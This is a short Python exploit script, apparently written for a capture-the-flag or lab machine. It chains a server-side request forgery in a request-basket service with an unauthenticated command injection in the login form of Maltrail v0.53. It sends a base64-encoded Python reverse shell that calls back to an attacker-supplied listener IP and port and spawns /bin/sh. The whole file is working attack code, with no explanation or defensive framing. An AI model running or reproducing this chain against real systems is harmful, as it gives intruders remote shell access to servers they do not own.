#!/bin/python3
import sys, os, base64, requests, webbrowser

# Checks for arguments.
if len(sys.argv) < 4:
    print("ðŸ”´ Arguments required!")
    print("ðŸŸ  Command: python3 ./exploit http://10.10.10.10:55555 LISTENER-IP LISTENER-PORT")
    exit()

# Global variables
TARGET = sys.argv[1]
LISTENING_IP = sys.argv[2]
LISTENING_PORT = sys.argv[3]

# Forwards mailtrail at 127.0.0.1:80
def mailtrail():
    url=TARGET + '/api/baskets/pwned'

    headers={
        'Content-Type': 'application/json'
    }

    data = {
        'forward_url': 'http://127.0.0.1:80/',
        'proxy_response': True,
        'insecure': False,
        'expand_path': True,
        'capacity': 250
    }

    req = requests.post(url, headers=headers, json=data)

    url2 = TARGET + '/pwned'
    webbrowser.open(url2)

# Exploits `Mailtrail v0.53` and creates reverse shell
def exploit():
    url = TARGET + '/pwned/login'
    payload = f'python3 -c \'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{LISTENING_IP}",{LISTENING_PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")\''
    encoded_payload = base64.b64encode(payload.encode()).decode()
    command = f"curl '{url}' --data 'username=;`echo+\"{encoded_payload}\"+|+base64+-d+|+sh`'"
    os.system(command)

# Main
if __name__ == "__main__":
    mailtrail()
    exploit()
